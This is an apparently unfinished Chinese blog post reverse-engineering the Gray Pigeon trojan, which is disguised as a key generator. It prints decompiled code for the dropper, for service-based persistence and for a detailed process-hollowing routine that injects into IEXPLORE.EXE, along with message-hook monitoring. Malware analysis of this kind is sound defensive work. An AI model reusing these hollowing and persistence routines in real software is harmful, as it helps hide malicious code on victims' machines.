---
title: huigezi analysis(TBC)
date: 2018-09-01 12:12:18
categories:
 - taka
tags:
 - malware analysis
 - reverse
---
> tools: OllyDBG, IDA Pro, Process Monitor

可执行文件`AES20093429.exe`，应该是伪装成了注册机

<!--more-->

`WinMain`函数

```c
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  /* ... */
  if ( SetFilePointer(v5, -8 - (_DWORD)hInstancea, 0, 2u) != -1
    && (v6 = lpBuffer, ReadFile(v5, lpBuffer, (DWORD)hInstancea, &v30, 0))
    && (HINSTANCE)v30 == hInstancea
    && *v6 == -2103789659 )
  {
    v7 = v6 + 1;
    if ( !GetTempPathA(0x104u, &Filename) ) // start from here
    {
      lpText = aCanTRetrieveTh;
      goto LABEL_42;
    }
    v8 = *v7;                                   // 4
    v9 = (int)(v7 + 1);
    wsprintfA(&v24, aE_X, v8);                  // "E_4"
    strcat(&Filename, &v24);                    // %temp%\E_4
    CreateDirectoryA(&Filename, 0);             // 创建文件夹
    strcat(&Filename, asc_40718C);              // %temp%\E_4\
    hInstancee = hInstancea - 3;
    v10 = (_DWORD *)(v9 + 4);
    sub_401119((_BYTE *)(v9 + 4), (signed int)hInstancee, *(_DWORD *)v9);
    hInstanceb = hInstancee - 2;
    v11 = *(_DWORD *)(v9 + 8);
    v31 = *(_DWORD *)(v9 + 8);
    if ( (signed int)hInstanceb > 0 && *v10 == 0x33E0F0D && v11 > 0 ){
      v12 = (char *)operator new(v11);
      if ( v12 ){
        if ( sub_40321B((int)v12, &v31, (int)(v10 + 2), (int)hInstanceb) ){// 解压数据
          operator delete(v12);
          lpText = aFailedToDecomp;             // "Failed to decompress data!"
        }
        else{
          /* ... */
          do{                                   // 释放文件krnln.fnr, shell.fne到文件夹%temp%\E_4\下
            v13 = v12;
            hInstancec = v12;
            v14 = v12;
            v15 = (DWORD *)&v12[strlen(v12) + 1];
            if ( !_strcmpi(v14, aKrnln_fnr) || !_strcmpi(v13, aKrnln_fne) ) //first file: "krnln.fnr"
              strcpy(&v25, v13);
            v16 = *v15;
            v17 = v15 + 1;
            strcpy(&FileName, &Filename);
            strcat(&FileName, hInstancec);      // %temp%\E_4\filename
            v18 = (HINSTANCE)CreateFileA(&FileName, 0x40000000u, 0, 0, 2u, 0x80u, 0);// CreateFileA(
                                                // FileName = "%temp%\E_4\filename"
                                                // Access = GENERIC_WRITE,
                                                // ShareMode = 0,
                                                // pSecurity = NULL,
                                                // Mode = CREATE_ALWAYS,
                                                // Attributes = NORMAL,
                                                // hTemplateFile = NULL
                                                // )
            hInstanced = v18;
            if ( v18 != (HINSTANCE)-1 ){
              WriteFile(v18, v17, v16, &NumberOfBytesWritten, 0); // 写文件
              CloseHandle(hInstanced);
            }
            v12 = (char *)v17 + v16;            // next file: "shell.fne"
          }
          while ( (unsigned int)v12 < v33 );
          if ( v25 ){
            strcpy(&FileName, &Filename);
            strcat(&FileName, &v25);
            v19 = LoadLibraryA(&FileName);      // load library "knrln.fnr"
            if ( v19 ){
              v20 = GetProcAddress(v19, ProcName);// "GetNewSock"
              if ( v20 ){
                v32 = (void (__stdcall *)(signed int))((int (__stdcall *)(signed int))v20)(1000);// 然后调用knrln.fnr.GetNewSock函数
              }
            }
          }
        }
        /* ... */
      }
    }
  }

LABEL_44:
  if ( lpText ) // 错误处理
    MessageBoxA(0, lpText, Caption, 0x10u);
  else
    v32(0x409000);                              // v32 = knrln.fnr.GetNewSock(1000);
                                                // v32(0x409000);  
                                                // "WTNE / MADE BY E COMPILER - WUTAO"  -- meaningless???
  return 0;
}
```
程序流程大概是：

    创建%temp%\E_4文件夹
    解压缩数据，并在%temp%\E_4下释放两个文件：krnln.fnr 和shell.fne(均为dll文件)
    然后调用krnln.GetNewSock(这个函数没看懂是做什么)


`GetNewSock`函数返回后，直接跳到函数`sub_4093F1`(`ecode`段)
函数`sub_4093F1`调用`krnln.fnr`, 在`%temp%`文件夹下创建两个文件：`AES3429.exe`（伪装的注册机程序）和`Server_Setup.exe`（灰鸽子服务端程序）并，然后在新进程中执行`cmd /c start %temp%\AES3429.exe`和`cmd /x start %temp%\Server_Setup.exe`(调用`CreateProcess`)

```c
int sub_4093F1()
{
  /* ... */
  /* start from here */
  while ( 1 )
  {
    /* ... */
    v48 = sub_409BCA(3);                        // "AES3429.exe*1*553070" | "Server_Setup.exe*553071*761344"
    /* ... */
    LODWORD(v27) = sub_409BCA(1);               // "1" | "553071"
    /* ... */
    LODWORD(v30) = sub_409BCA(1);               // "553070" | "761344"
    /* ... */
    v69 = sub_409BD6(1, 11, 0, 0x80000301);     // GetTempPath
    /* ... */
    v64 = sub_409395(v69);                      // strcat
    /* ... */
    sub_409BCA(2);                              // krnln.10028F61(filename, 2)
                                                // krnln.1005F250: createFile, WriteFile, CloseFile
                                                //   %temp%\AES3429.exe | %temp%\Server_Setup.exe
    if ( v64 )
      sub_409BBE(v64);
    v70 = sub_409BD6(1, 11, 0, -2147482879);
    /* ... */
    v65 = sub_409395(55);                       //个strcat
    if ( v70 )
      sub_409BBE(v70);
    sub_409BCA(3);                              // krnln.10028F61(cmd, 3)
                                                // krnln.10059E20, 调用CreateProcessA运行cmd指向的命令
                                                // "cmd /c start %temp%\AES3429.exe"
    if ( v65 )
      sub_409BBE(v65);
    v12 = v51;
    v14 = v54;
    v13 = v59;
  }
  /* ... */
}
```

然后可以开始分析`Server_Setup.exe`了（未加壳）

```shell
a rough process: 
                                                                 +-----------------------+
                                                                 |      sub_459DC8       |
                                                                 +-----------------------+
          as IE process or else                                    ^
  +---------------------------------------+                        | exe injection
  |                                       v                        |
+-------+  service   +------------+     +------------+  not ie   +-----------------------+     +------------+     +------------+     +------------+
| start | ---------> | sub_4A1934 | --> | sub_4A185C | --------> |      sub_49C348       | --> | sub_49DA10 | --> | sub_457114 | --> | sub_45707C |
+-------+   start    +------------+     +------------+           +-----------------------+     +------------+     +------------+     +------------+
                                          |                                                                                            ^
                                          |                                                                                            |
                                          v                                                                                            |
                                        +------------+           +-----------------------+                                             |
                                        | sub_4572C0 | --------> |      sub_45712C       | --------------------------------------------+
                                        +------------+           +-----------------------+
                                                                   |
                                                                   | no message avaliable
                                                                   v
                                                                 +-----------------------+
                                                                 |      sub_4579FC       |
                                                                 +-----------------------+

```

程序运行时会判断一些标志位（程序开始时设置，**没看懂设置的是什么，待补充**），以下只是大概的逻辑。

`start`函数：
```c
if(当前可执行文件名 == "IEXPLORE.EXE"){
    /* 伪装成IE进程 */
    调用函数sub_4A185C; // really important
}
else{
    /* 第一次执行 */
    if(当前可执行文件全路径 != "C:\Windows\Hacker.com.cn.exe"){
        将当前可执行文件复制为C:\Windows\Hacker.com.cn.exe;
        设置文件C:\Windows\Hacker.com.cn.exe为隐藏的只读系统文件;
        创建自启动服务GrayPigeon_Hacker.com.cn, binaryPath=C:\Windows\Hacker.com.cn.exe;
        启动服务GrayPigeon_Hacker.com.cn;
    }
    else{
        /* 作为服务启动时的参数 */
        调用STartServiceCtrlDispatcher，连接程序主线程到SCM，服务主函数为sub_4A1934;
    }
}
``` 

函数`sub_4A1934`做了一些初始化的工作，然后通过`Create_Thread`调用函数`sub_4A185C`。

函数`sub_4A185C`：

```c
int __usercall sub_4A185C@<eax>(int a1@<ebx>, int a2@<esi>)
{
  int v2; // eax@3
  int v3; // eax@3
  int v4; // eax@3

  if ( byte_4A7F64 )                    // 如果进程被伪装为IEXPLORE.exe，此标志为0
    sub_49C348(a1, a2);                 // 否则，进行exe注入
  v2 = *off_4A5978[0];
  sub_457228();
  *(_BYTE *)(*off_4A5978[0] + 91) = 0;
  v3 = *off_4A5978[0];
  sub_457240(off_4A5690, off_4971CC);   // TLS
  v4 = *off_4A5978[0];
  return sub_4572C0();                  // 关键函数
}
```

函数`sub_49C348`:
```c
int __usercall sub_49C348@<eax>(int a1@<ebx>, int a2@<esi>)
{
  /* ... */
  if ( (unsigned __int8)getVersionEx() == 1 && byte_4A7ED4 == 1 )// return a non-zero value if function succeeds
  {
    sub_49FD3C((int *)&v17);                    // GetWindowsDirectory
    LOBYTE(v2) = *v17;                          // 获取Windows文件夹所在的盘符, 一般是'C'
    sub_404B84(v3, v2);
    sub_404CA8(&v20, v18, (int)":\\Program Files\\Internet Explorer\\IEXPLORE.EXE");// strcat (????)
    if ( sub_40950C(v20) )                      // "C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE"
                                                // 如果存在(????)
    {
      v5 = (_DWORD *)sub_403B7C(v4, 1, (int)off_413A48);
      sub_402B9C(0, &v16);                      // 参数为0: GetModuleFileName，获取当前可执行文件全路径
      sub_418374(v6, v16, v5);  
      v7 = (*(int (__cdecl **)(unsigned int, void *, int *, int, int))*v5)(v11, v12, v13, v14, v15);
      sub_417C1C(v5, 0, 0);                     
      sub_405D14(&v19, (int)dword_49C328, 1, v7);
      (*(void (__fastcall **)(int, int))(*v5 + 12))(v7, v19);
      sub_403BAC(v5);
      if ( sub_459DC8((int)v20, v19) )          // "C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE"
                                                // exe注入 —— 傀儡进程
      {
        sub_49DA10(0xBB8u);                     // 关键函数sub_45707C
        ExitProcess_0(0);
      }
    }
  }
  /* ... */
}
```

这里有两个关键函数，`sub_459DC8`和`sub_49DA10`（或者说`sub_45707C`）
函数`sub_459DC8`用于将自身代码注入傀儡进程`IEXPLORE.EXE`，即IE浏览器进程；
~~`sub_45707C`则是真正执行恶意功能的函数~~。

先了解一下什么是`exe注入`。

>  直接将自身代码注入傀儡进程，不需要DLL。首先用CreateProcess来创建一个挂起的IE进程，创建时候就把它挂起。然后得到它的装载基址，使用函数ZwUnmapViewOfSection来卸载这个这个基址内存空间的数据，再用VirtualAllocEx来给ie进程重新分配内存空间，大小为要注入程序的大小(就是自身的imagesize)。使用WriteProcessMemory重新写IE进程的基址，就是刚才分配的内存空间的地址。再用WriteProcessMemory把自己的代码写入IE的内存空间。用SetThreadContext设置下进程状态，最后使用ResumeThread继续运行IE进程。

[CSDN: exe注入 - 傀儡进程](https://blog.csdn.net/sevenpic/article/details/5880523) (**original not found**)

（搜索资料时刚好看到这一段）

然后来看`sub_459DC8`这个函数，发现刚好符合exe注入。
```c
int __usercall sub_459DC8@<eax>(int a1@<eax>, int a2@<edx>)
{
  v49 = a2;
  v50 = (char *)a1; // "C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE"
                    // 选择IE进程作为傀儡进程，可以穿透防火墙
  /* ... */
  if ( v50 )
  {
    /* ... */
    v21 = sub_404E5C(v50);
    /* CreateProcess时，CreationFlag被设置为4，即 CREATE_SUSPENED */
    /* 也就是说，新进程的主进程会在创建后被挂起，直到ResumeThread函数被调用才运行 */
    /* 这样，父进程就可以修改子进程地址空间中的内存等等 */
    if ( !CreateProcessA(0, v21, 0, 0, 0, 4u, 0, 0, &StartupInfo, &ProcessInformation) ) 
      goto LABEL_36;
    v36 = 65543;
    GetThreadContext(ProcessInformation.hThread, (LPCONTEXT)&v36); //获取傀儡进程（在这里是IE进程）上下文信息
    ReadProcessMemory(ProcessInformation.hProcess, (LPCVOID)(v37 + 8), &Buffer, 4u, &NumberOfBytesRead); // 获取IE进程的装载地址
    /* 通过 for循环得到 IE进程的镜像大小 */
    for ( i = Buffer;
          VirtualQueryEx(ProcessInformation.hProcess, i, &v33, 0x1Cu) && v33.State != 0x10000;
          i += v33.RegionSize );
    v23 = i - Buffer;
    v41 = v23;
    lpBaseAddress = 0;
    if ( v23 >= dwSize && *(char **)(v39 + 52) == Buffer ) // IE进程的imagesize大于或等于自身imagesize，并且基地址相同
                                                           // *(char **)(v39 + 52)是之前得到的本进程的基地址
    {
      lpBaseAddress = Buffer;
      /* 则利用VirtualProtectEx设置从基地址到imagesize这块内存为可读可写 */
      /* 这里NewProtect被设置为0x40, 即PAGE_EXECUTE_READWRITE，RWX权限 */
      VirtualProtectEx(ProcessInformation.hProcess, Buffer, v23, 0x40u, &flOldProtect); 
LABEL_28:
      if ( lpBaseAddress )
      {
        WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(v37 + 8), &lpBaseAddress, 4u, &NumberOfBytesRead); // 重写基地址
        if ( WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, lpBuffer, dwSize, &NumberOfBytesRead) ) // 将自身代码写入IE进程内存空间
        {
          v36 = 65543;
          if ( lpBaseAddress == Buffer )
            v38 = (char *)(*(_DWORD *)(v39 + 40) + *(_DWORD *)(v39 + 52));
          else
            v38 = (char *)lpBaseAddress + *(_DWORD *)(v39 + 40);
          SetThreadContext(ProcessInformation.hThread, (const CONTEXT *)&v36); // 设置IE进程上下文信息
          ResumeThread(ProcessInformation.hThread); // 恢复IE进程主线程
                                                    // 这就达到了使用傀儡进程的外壳来执行自身恶意代码的目的
          v48 = -1;
        }
        else
        {
          TerminateProcess(ProcessInformation.hProcess, 0);
        }
      }
LABEL_36:
      __writefsdword(0, v27);
      v29 = (int *)&loc_45A153;
      goto LABEL_37;
    }
    /* 如果IE进程的imagesize小于自身imagesize，或基地址不同 */
    v24 = LoadLibraryA("ntdll.dll");
    v25 = v24;
    if ( v24 )
    {
      dword_4A6D10 = (int (__stdcall *)(_DWORD, _DWORD))GetProcAddress_0(v24, "ZwUnmapViewOfSection");
      if ( dword_4A6D10 ){
        /* 则调用ZwUnmapViewOfSection函数卸载基址内存空间的数据 */
        if ( !dword_4A6D10(ProcessInformation.hProcess, Buffer) )
          /* 然后调用VirtualAllocEx给IE进程重新分配内存空间，大小为当前进程imagesize大小 */
          lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, *(LPVOID *)(v39 + 52), dwSize, 0x3000u, 0x40u);
        goto LABEL_28;
      }
      FreeLibrary_0(v25);
      sub_4043E4(v27, v28, v29);
    }
    else
    {
      sub_4043E4(v27, v28, v29);
    }
  }
LABEL_37:
  __writefsdword(0, v30);
  v32 = (int *)&loc_45A170;
  sub_40499C();
  return v48;
}
```
接下来是`sub_45707C`。
```c
int __usercall sub_45707C@<eax>(int a1@<eax>, struct tagMSG *a2@<edx>, int a3@<ecx>)
{
  struct tagMSG *v3; // edi@1
  int v4; // esi@1
  int v5; // ebx@1
  int v6; // eax@4
  int v8; // [sp+0h] [bp-10h]@1

  v8 = a3;
  v3 = a2;
  v4 = a1;
  v5 = 0;
  if ( PeekMessageA(a2, 0, 0, 0, 1u) )          // 查看进程的消息队列，和GetMessage类似，但不会等到有消息放入队列时才返回
                                                // （也就是如果消息队列中没有消息则返回false）
                                                // 最后一个参数为wRemoveMsg，此处为1，即PM_REMOVE，messages are removed from the queue after processing by PeekMessage
  {
    LOBYTE(v5) = 1;
    if ( v3->message == 18 )
    {
      *(_BYTE *)(v4 + 156) = 1;
    }
    else
    {
      LOBYTE(v8) = 0;
      if ( *(_WORD *)(v4 + 218) )
      {
        v6 = *(_DWORD *)(v4 + 220);
        (*(void (__fastcall **)(int *, struct tagMSG *))(v4 + 216))(&v8, v3);
      }
      if ( !(unsigned __int8)sub_456FDC(v4)     // 涉及到的一些windowsAPI
                                                // UnhookWindowsHookEx
                                                // CloseHandler
                                                // KillTimer
                                                // (钩子处理函数)
        && !(_BYTE)v8
        && !(unsigned __int8)sub_456ED4(v4, v3) // TranslateMDISysAccel
                                                // 转换消息为系统命令
        && !(unsigned __int8)sub_456F24(v4, (int)v3)// GetCapture返回捕获了鼠标的窗口
                                                // 然后向该窗口（或父窗口，如果GetCapture返回0）发送消息(SendMessage)
        && !(unsigned __int8)sub_456EB0(v4, v3) )// IsDialogMessage
      {
        TranslateMessage(v3);                   // 用来把虚拟键消息转换为字符消息。
                                                // 由于Windows对所有键盘编码都是采用虚拟键的定义，
                                                // 这样当按键按下时，并不得到字符消息，
                                                // 需要键盘映射转换为字符的消息。
        DispatchMessageA(v3);                   // 把 TranslateMessage转换的消息发送到窗口的消息处理函数，
                                                // 此函数在窗口注册时已经指定。
      }
    }
  }
  return v5;
}
```
可以看到本函数中存在对`UnhookWindowsHookEx`的调用，考虑到`UnhookWindowsHookEx`和`SetWindowsHookEx`通常是成对出现的, 查看IDA的imports, 找到函数`sub_455B68`对此API的调用：
```c
SetWindowsHookExA(3, sub_455B24, 0, v2);
```
`idHook`参数被设置为`3`, 即`WH_GETMESSAGE`, 用于监测(或拦截)`ProcessID`为`v2`的进程**发送到消息队列中的消息**, 钩子处理函数为`sub_455B24`(在上面的函数中也有调用).

由于Windows程序是**消息驱动**的, 本程序通过对消息拦截, 实际上可以监测到被感染用户的所有行为. 

> Windows程序设计时一种基于消息的时机驱动方式的设计模式，完全不同于传动的DOS方式的程序设计方法，在Windows中，编程的框架都是响应和发送消息。例如，当用户在窗口中画图的时候，按下鼠标左键，此时操作系统会感知这一事件，于是将这个事件包装成一个消息，投递到应用程序的消息队列中，然后应用程序从消息队列中取出消息并响应，在这处理过程中，操作系统也给应用系统发送消息，所谓的“发送消息”，实际上是操作系统调用程序中一个专门处理消息的函数，称为窗口过程。

[CSDN: Windows运行机理——消息与消息队列](https://blog.csdn.net/z609932088/article/details/79591577)

至于为什么是所有行为...

在函数`sub_4579FC`中, 程序会试图获取光标所在的位置(调用`GetCursorPos`, 以屏幕坐标表示), 然后调用`WindowFromPoint`得到包含该位置的窗口的句柄, 或者调用`GetCapture`获取鼠标所在窗口的句柄, 获取窗口进程ID, 就可以用`hook`监控用户行为了.

查看程序的import表, 还可以发现其他一些有用的API.
for example:
```shell
+---------------------+-----------+ 
|    function name    |  Library  | 
+---------------------+-----------+ 
|        socket       |  wsock32  | 
+---------------------+-----------+ 
|     gethostname     |  wsock32  | 
+---------------------+-----------+ 
|      send/recv      |  wsock32  | 
+---------------------+-----------+ 
|    recv/recvfrom    |  wsock32  | 
+---------------------+-----------+ 
|      setsockopt     |  wsock32  | 
+---------------------+-----------+ 
|       connect       |  wsock32  | 
+---------------------+-----------+ 
| inet_ntoa/inet_addr |  wsock32  | 
+---------------------+-----------+ 
|     ntohs/htons     |  wsock32  | 
+---------------------+-----------+ 
|     bind/listen     |  wsock32  | 
+---------------------+-----------+
```
猜测是用于发送用户数据到灰鸽子客户端, 以及从客户端接受命令的.

(感慨一下IDA真好用)

由于无法访问傀儡进程内存, 还需要找其他方法来调试这些函数. 

TBC
